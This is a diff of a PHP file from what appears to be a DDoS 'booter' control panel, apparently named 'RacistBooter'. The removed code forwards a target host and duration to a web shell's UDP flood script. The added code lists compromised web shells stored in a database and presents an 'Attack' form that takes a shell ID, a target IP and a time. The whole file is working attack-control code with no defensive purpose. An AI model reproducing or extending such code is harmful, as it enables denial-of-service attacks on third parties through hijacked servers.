@@ -1,16 +1,20 @@
 <?php
 
-include 'EpiCurl.php';
+include 'includes/init.php';
 
-$host = $_GET['host'];
-$time = intval($_GET['time']);
-$mc = EpiCurl::getInstance();
+$result = mysql_query("SELECT * FROM shells") or die (mysql_error());
 
-$shell = trim("http://127.0.0.1/RacistBooter/udp.php?act=phptools&host={$host}&time={$time}");
-
-$ch = curl_init($shell);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
-curl_setopt($ch, CURLOPT_TIMEOUT, 15);
-$curl1 = $mc->addCurl($ch);	     
-echo "Response code from 127.0.0.1 is {$curl1->code}\n"; 
+while ($row = mysql_fetch_assoc($result))  
+{
+	echo "{$row['id']} : <a href=\"{$row['shellurl']}\">{$row['shellurl']}</a> <br /><br />";
+}
+	echo'
+	Write all in Shell ID to attack with all shells!<br />
+	<form action="attack.php" method="get">
+	<b>Shell ID:</b> <input type="text" size="20" maxlength="15" name="shellid" /><br />
+	<b>IP:</b> <input type="text" size="20" maxlength="15" name="host" /><br />
+	<b>Time:</b> <input type="text" size="20" name="time" /><br />
+	<input type="submit" value="Attack" />
+	</form>
+	';
 ?>
